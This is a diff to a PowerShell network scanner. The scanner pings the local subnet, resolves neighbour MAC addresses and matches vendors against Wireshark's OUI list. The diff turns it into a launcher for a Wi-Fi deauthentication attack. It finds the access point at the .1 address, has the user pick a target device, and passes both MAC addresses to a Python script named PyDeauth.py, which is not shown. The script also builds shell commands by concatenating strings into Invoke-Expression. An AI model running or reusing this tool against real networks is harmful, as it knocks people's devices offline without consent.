@@ -3,7 +3,11 @@ PARAM
 (
     [Parameter(Position=100,Mandatory=$false)]
 	[ValidateNotNullOrEmpty()]
-    [Int16] $MaxValue = 256,
+    [Int16] $MaxValue = 255,
+
+    [Parameter(Position=101,Mandatory=$false)]
+	[ValidateNotNullOrEmpty()]
+    [String] $Interface = "enp0s3",
 
 	[Parameter()]
     [Switch] $FullComparison,
@@ -39,16 +43,11 @@ BEGIN
         return
     }
 
-    # Progress Bar Details - Do not change this comment [StatusStepCountFlag]
-    $MainStepNum = 1
-    $StepDescription = "Getting OUI data from WireShark database."
-    if ($LocalDB) {$StepDescription = "Getting OUI data from local copy of WireShark database."}
-    Write-Progress -Id $MainProgressID -Activity $MainActivity -Status (& $MainStatusBlock) -PercentComplete (($MainStepNum  - 1) / $TotalMainSteps * 100)
-
     # Get host IP Address.
+    Write-Verbose "Acquiring host IP Address..."
     if ($IsWindows)
     {
-        Invoke-Expression '$IPAddress = (Get-NetIPConfiguration | Where-Object {$_.InterfaceAlias -eq "Wi-Fi"}).IPv4Address.IPAddress'
+        Invoke-Expression '$PersonalIPAddress = (Get-NetIPConfiguration | Where-Object {$_.InterfaceAlias -eq "Wi-Fi"}).IPv4Address.IPAddress'
     }
     elseif($IsMacOS) 
     {
@@ -60,7 +59,7 @@ BEGIN
             $PersonalIPAddressList += , $RawIPAddressData.Trim().Split(" ")[1]
         }
         #TODO: Figure out a better way to identify local IP address from list
-        $IPAddress = $PersonalIPAddressList[1]
+        $PersonalIPAddress = $PersonalIPAddressList[1]
     }
     elseif($IsLinux)
     {
@@ -72,14 +71,22 @@ BEGIN
             $PersonalIPAddressList += , $RawIPAddressData.Trim().Split(" ")[1].Split("/")[0]
         }
         #TODO: Figure out a better way to identify local IP address from list
-        $IPAddress = $PersonalIPAddressList[1]
+        $PersonalIPAddress = $PersonalIPAddressList[1]
     }
     else
     {
         Write-Error "$($PSVersionTable.OS) is not supported."
     }
+    Write-Debug $PersonalIPAddress
+
+    # Progress Bar Details - Do not change this comment [StatusStepCountFlag]
+    $MainStepNum = 1
+    $StepDescription = "Getting OUI data from WireShark database."
+    if ($LocalDB) {$StepDescription = "Getting OUI data from local copy of WireShark database."}
+    Write-Progress -Id $MainProgressID -Activity $MainActivity -Status (& $MainStatusBlock) -PercentComplete (($MainStepNum  - 1) / $TotalMainSteps * 100)
 
     # Get a list of vendor OUI's from wireshark's database.
+    Write-Verbose "Building OUI Table..."
     if (-not($LocalDB))
     {
         $VendorListRaw = (Invoke-WebRequest -Uri "https://gitlab.com/wireshark/wireshark/raw/master/manuf").Content
@@ -91,7 +98,6 @@ BEGIN
         $VendorListContent = Get-Content -Path "$PSScriptRoot/wireSharkDB.txt" | Where-Object {-not ($_.StartsWith("#"))} | Where-Object {$_.Trim() -ne ""}
     }
     
-
     # Separate the list into short and long OUI's.
     $LongVendorTable = @{}
     $ShortVendorTable = @{}
@@ -122,7 +128,8 @@ PROCESS
 		#endregion
 
         # Get the ip prefix.
-        $IpPrefix = ([String] $IPAddress.Split(".")[0..2]).Replace(" ",".")
+        $IpPrefix = ([String] $PersonalIPAddress.Split(".")[0..2]).Replace(" ",".")
+        Write-Debug $IpPrefix
 
         # Progress Bar Details - Do not change this comment [StatusStepCountFlag]
         $MainStepNum++
@@ -146,25 +153,38 @@ PROCESS
 
         # Get a list of active IP addresses on the network.
         $IPAddressList = @()
+        $NeighborList = @()
         $ScanStepNum = 0
-        for ($i = 0; $i -lt $MaxValue; $i++)
+        for ($i = 1; $i -lt $MaxValue; $i++)
         {
             # Progress Bar Details - Do not change this comment [ScanCountFlag]
             $ScanStepNum++
-            $ScanDescription = "Pinging $IpPrefix.$i"
+            $CurrIPAddress = "$IpPrefix"+".$i"
+            $ScanDescription = "Pinging $CurrIPAddress"
             Write-Progress -Id $ScanProgressID -Activity $ScanActivity -Status (& $ScanStatusBlock) -PercentComplete ($ScanStepNum / $TotalScanSteps * 100)
 
-            $Reply = Test-Connection -Ping "$IpPrefix.$i" -Count 1 -TimeoutSeconds 2
+            $Reply = Test-Connection -Ping "$CurrIPAddress" -Count 1 -TimeoutSeconds 2
             
-            Write-Verbose "$($IpPrefix.$i): Status = $($Reply.Reply.Status)"
+            Write-Debug "$CurrIPAddress : Status = $($Reply.Reply.Status)"
             if ($Reply.Reply.Status -eq "Success")
             {
                 $IPAddressList += , $Reply.Reply.Address.IPAddressToString
+                if ($IsLinux -and $Reply.Reply.Address.IPAddressToString -notin $PersonalIPAddressList)
+                {
+                    $Command = 'ip neighbor | grep "' + $Reply.Reply.Address.IPAddressToString + ' "'
+                    $NeighborRaw = Invoke-Expression -Command $Command
+                    $MACAddress = $NeighborRaw.Trim().Split(" ")[4]
+                    $IPAddress = $NeighborRaw.Trim().Split(" ")[0]
+                    $Neighbor = New-Object -TypeName "PSObject"
+                    Add-Member -InputObject $Neighbor -NotePropertyName "LinkLayerAddress" -NotePropertyValue $MACAddress
+                    Add-Member -InputObject $Neighbor -NotePropertyName "IPAddress" -NotePropertyValue $IPAddress
+                    $NeighborList += $Neighbor
+                }
             }
         }
 
         # Filter out host IPAddress.
-        $IPAddressList = $IPAddressList | Where-Object {$_ -ne $IPAddress}
+        $IPAddressList = $IPAddressList | Where-Object {$_ -ne $PersonalIPAddress}
 
         # Progress Bar Details - Do not change this comment [StatusStepCountFlag]
         $MainStepNum++
@@ -181,20 +201,6 @@ PROCESS
             Write-Error "Need to implement lookup for MACOS."
             return
         }
-        elseif ($IsLinux)
-        {
-            $NeighborListRaw = (Invoke-Expression "ip neighbor").Split('`n')
-            $NeighborList = @()
-            foreach ($NeighborRaw in $NeighborListRaw)
-            {
-                $MACAddress = $NeighborRaw.Trim().Split(" ")[4]
-                $IPAddress = $NeighborRaw.Trim().Split(" ")[0]
-                $Neighbor = New-Object -TypeName "PSObject"
-                Add-Member -InputObject $Neighbor -NotePropertyName "LinkLayerAddress" -NotePropertyValue $MACAddress
-                Add-Member -InputObject $Neighbor -NotePropertyName "IPAddress" -NotePropertyValue $IPAddress
-                $NeighborList += $Neighbor
-            }
-        }
         
         # Progress Bar Details - Do not change this comment [StatusStepCountFlag]
         $MainStepNum++
@@ -202,6 +208,7 @@ PROCESS
         Write-Progress -Id $MainProgressID -Activity $MainActivity -Status (& $MainStatusBlock) -PercentComplete (($MainStepNum  - 1) / $TotalMainSteps * 100)
 
         # Compare the MAC address against the OUI table and build an array of result objects to report on.
+        Write-Verbose "Generating report."
         $Report = @()
         foreach ($Neighbor in $NeighborList)
         {
@@ -245,8 +252,33 @@ PROCESS
             $Report += $Result
         }
 
-        # Return the results.
-        Return $Report
+        #Write-Debug $Report
+
+        # Find the access point in the report
+        $AccessPoint = $Report | Where-Object {$_.IPAddress -eq "$IpPrefix.1"}
+        $Report = $Report | Where-Object {$_.IPaddress -ne "$IpPrefix.1"}
+
+        # Progress Bar Details - Do not change this comment [StatusStepCountFlag]
+        $MainStepNum++
+        $StepDescription = "Entering Deauthentication Process..."
+        Write-Progress -Id $MainProgressID -Activity $MainActivity -Status (& $MainStatusBlock) -PercentComplete (($MainStepNum  - 1) / $TotalMainSteps * 100)
+
+
+        Write-Host "Select a device to deauthenticate:"
+        $i = 0
+        foreach ($Result in $Report)
+        {
+            Write-Host "$i : $($Result.HostName) - $($Result.IPAddress)"
+            $i++
+        }
+        
+        $Index = Read-Host "Device Number"
+        $PythonArgs  = (Resolve-Path -Path "$PSScriptRoot/PyDeauth.py").Path
+        $PythonArgs += " " + $AccessPoint.MACAddress + " " + $Report[$Index].MACAddress + " " + $Interface
+        $PythonCommand = [ScriptBlock]::Create("/usr/bin/python3 $PythonArgs")
+
+        $Res = Invoke-Command -ScriptBlock $PythonCommand
+        Write-Host "Deauthenticating $($Report[$Index].HostName)"
 
 		#region - Template code - Core - Try End
 	}
